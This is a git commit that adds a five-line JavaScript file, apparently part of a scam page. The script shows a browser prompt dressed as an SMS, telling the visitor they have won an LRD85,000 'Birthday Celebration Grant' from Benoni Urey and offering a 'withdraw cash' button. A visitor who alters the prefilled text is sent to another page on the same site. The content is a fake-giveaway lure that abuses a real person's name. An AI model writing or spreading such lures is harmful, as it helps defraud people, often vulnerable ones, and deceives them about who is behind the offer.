91778ce7932978a361eee762e30facee19d9eb4a
bigbagzz <usakpolo247@gmail.com>
2025-05-27 07:35:56 +0100

    Create liberia-active.js

---
+++ liberia-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW LRD85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive LRD85,000 Birthday Celebration Grant from Benoni Urey, Press Ok to withdraw cash Now ','WITHDRAW LRD85,000');
+if (password != 'WITHDRAW LRD85,000') {
+location.href='https://bigbagz.org/benoni.html';
+}
